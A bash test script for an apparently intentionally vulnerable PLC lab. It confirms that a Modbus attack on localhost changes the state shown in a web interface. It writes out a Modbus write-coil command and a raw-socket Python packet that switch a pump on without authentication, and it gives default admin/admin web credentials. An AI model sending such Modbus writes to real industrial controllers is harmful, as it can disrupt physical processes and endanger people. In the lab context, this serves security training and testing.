#!/bin/bash
# Quick test to verify Modbus attacks affect web UI

echo "==================================="
echo "Modbus Attack → Web UI Test"
echo "==================================="
echo ""
echo "STEP 1: Check current state"
echo "---------------------------------"
if [ -f /tmp/plc_state.json ]; then
    echo "Current pump1_status:"
    cat /tmp/plc_state.json | grep -o '"pump1_status":[^,}]*' || echo "  Not set yet"
else
    echo "  State file doesn't exist - containers may not be running"
    echo "  Run: vuln-plc → Start"
    exit 1
fi

echo ""
echo "STEP 2: Running Modbus attack..."
echo "---------------------------------"
echo "Command: modbus write-coil 127.0.0.1:5502 0 1"
echo "Effect: Turn Pump 1 ON"
echo ""

# Run the attack
if command -v modbus &> /dev/null; then
    modbus write-coil 127.0.0.1:5502 0 1 2>&1 | head -5
else
    echo "  'modbus' tool not found - install with:"
    echo "  sudo apt install libmodbus-dev"
    echo ""
    echo "  Trying Python alternative..."
    python3 -c "
import socket, struct
s = socket.socket()
s.connect(('127.0.0.1', 5502))
req = struct.pack('>HHHB', 1, 0, 6, 1) + struct.pack('>BHH', 0x05, 0, 0xFF00)
s.send(req)
s.recv(1024)
s.close()
print('  ✓ Pump 1 turned ON via Modbus')
"
fi

echo ""
echo "STEP 3: Wait for state update..."
echo "---------------------------------"
sleep 1

echo ""
echo "STEP 4: Check new state"
echo "---------------------------------"
if [ -f /tmp/plc_state.json ]; then
    echo "New pump1_status:"
    cat /tmp/plc_state.json | grep -o '"pump1_status":[^,}]*' || echo "  Not found"
    echo ""
    echo "Full state:"
    cat /tmp/plc_state.json | python3 -m json.tool 2>/dev/null || cat /tmp/plc_state.json
fi

echo ""
echo "==================================="
echo "NOW CHECK THE WEB UI!"
echo "==================================="
echo ""
echo "1. Open: http://localhost:5000/process"
echo "2. Login: admin / admin"
echo "3. Look for: 'Pump 1 Status'"
echo "4. It should show: true (ON)"
echo ""
echo "If pump1_status = true above, it WILL show"
echo "as ON/true in the web UI!"
echo ""
echo "Try toggling it:"
echo "  ON:  modbus write-coil 127.0.0.1:5502 0 1"
echo "  OFF: modbus write-coil 127.0.0.1:5502 0 0"
echo ""
